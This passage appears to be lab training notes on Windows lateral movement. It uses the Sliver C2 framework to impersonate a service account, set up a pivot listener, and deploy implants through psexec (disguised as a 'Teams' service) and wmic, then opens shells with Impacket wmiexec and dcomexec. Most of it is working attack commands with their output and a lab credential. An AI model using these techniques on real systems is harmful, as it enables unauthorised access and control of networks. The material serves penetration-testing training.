#### PsExec

```sh
sliver (http-beacon) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!


[*] Successfully impersonated child.htb.local\svc_sql. Use `rev2self` to revert to your previous token.
```

Having impersonated the `svc_sql` user, we can test our access to the resources on SRV01 by listing the contents of the `C:\` directory.

```sh
sliver (http-beacon) > ls //srv01.child.htb.local/c$
```
![](Screenshot%202026-11-11%20at%2012.08.03.png)

```sh
sliver (http-beacon) > pivots tcp --bind 172.16.1.11

[*] Started tcp pivot listener 172.16.1.11:9898 with id 1
```

```sh
sliver (http-beacon) > generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[*] Implant saved to /home/htb-ac590/psexec-pivot.exe
```

Jumping into the `psexec` utility, we must specify the path of the implant's binary.

```sh
sliver (http-beacon) > psexec --custom-exe /home/htb-ac590/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local
```
![](Screenshot%202026-11-11%20at%2012.09.56.png)

```sh
sliver (http-beacon) > sessions
```
![](Screenshot%202026-11-11%20at%2012.10.10.png)

```sh
sliver (http-beacon) > pivots
```
![](Screenshot%202026-11-11%20at%2012.10.21.png)
#### WMIC

```sh
sliver (http-beacon) > generate -i 172.16.1.11:9898 --skip-symbols -N wmicpivot
```

Right after having the implant generated, we would proceed by creating a logon session using `make-token` as explained earlier, and we need to upload the binary on disk on SRV02.

```sh
sliver (http-beacon) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!


[*] Successfully impersonated child.htb.local\svc_sql. Use `rev2self` to revert to your previous token.
sliver (http-beacon) > cd //srv02.child.htb.local/c$/windows/tasks

[*] \\srv02.child.htb.local\c$\windows\tasks
sliver (http-beacon) > upload wmicpivot.exe

[*] Wrote file to \\srv02.child.htb.local\c$\windows\tasks\wmicpivot.exe

sliver (http-beacon) > rev2self

[*] Back to self...
```

We can execute the wmic command to execute an implant on the remote host SRV02 via the beacon/session on WEB01.

```sh
wmic /node:172.16.1.13 /user:svc_sql /password:jkhnrjk123! process call create "C:\\windows\tasks\\wmicpivot.exe"
```

The above command can be executed via a PowerShell terminal on WEB01 or through the beacon.

```sh
sliver (http-beacon) >  execute -o wmic /node:172.16.1.13 /user:svc_sql /password:jkhnrjk123! process call create "C:\\windows\\tasks\\wmicpivot.exe"

[*] Output:
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
    ProcessId = 1128;
    ReturnValue = 0;
};
[*] Stderr:
```

Having executed the command, it will take advantage of the previous `pivot` that we have started on port 9898 and will connect back to WEB01.

```sh
[*] Session d35ddf7e wmicpivot - 10.129.205.234:49715->http-beacon-> (srv02) - windows/amd64 - Wed, 08 Nov 2023 08:43:20 GMT

sliver (http-beacon) > pivots

 ID   Protocol   Bind Address       Number Of Pivots 
==== ========== ================== ==================
  1   TCP        172.16.1.11:9898                  1 

sliver (http-beacon) > sessions

 ID         Name          Transport   Remote Address                        Hostname   Username        Operating System   Locale   Last Message                             Health  
========== ============= =========== ===================================== ========== =============== ================== ======== ======================================== =========
 d35ddf7e   wmicpivot         pivot       10.129.205.234:49715->http-beacon->   srv02      CHILD\svc_sql   windows/amd64      en-US    Wed Nov  8 08:43:20 GMT 2023 (15s ago)   [ALIVE] 
 b1ee85c3   http-beacon   http(s)     10.129.205.234:49715                  web01      CHILD\eric      windows/amd64      en-US    Wed Nov  8 08:43:33 GMT 2023 (2s ago)    [ALIVE]
```

An additional way of getting a shell on SRV02 would be possible with the help of `wmiexec.py` part of [Impacket](https://github.com/fortra/impacket), enabling us to get remote code execution on a remote host via WMI.

```sh
3kjS@htb[/htb]$ proxychains impacket-wmiexec child/svc_sql:jkhnrjk123\!@172.16.1.13
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:49696  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
srv02
```
#### DCOM

```sh
3kjS@htb[/htb]$ proxychains impacket-dcomexec -object MMC20 child/svc_sql:jkhnrjk123\!@172.16.1.13
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:49762  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
srv02
```
